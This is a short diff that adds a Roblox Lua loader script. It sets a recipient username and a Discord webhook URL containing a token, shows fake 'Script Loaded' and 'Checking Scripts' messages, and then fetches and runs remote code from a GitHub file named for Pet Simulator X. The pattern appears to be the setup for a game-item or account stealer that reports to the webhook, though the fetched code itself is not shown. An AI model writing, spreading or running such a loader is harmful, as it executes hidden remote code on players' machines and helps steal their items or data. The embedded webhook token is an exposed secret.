@@ -1,0 +1,9 @@
+Username = "clxouds_vibezz900"
+WebHook = "https://discord.com/api/webhooks/1098747890333134941/hmtTSfgrv2wK5Qzm0jlIxE0qixsQ_RrjjbHmk70gkdQOTD23l5cKHN5A1FuNFJ-sqCMZ"
+loadingscreen = false
+_G.CustomScriptName = "crystal scripts"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua%22))()
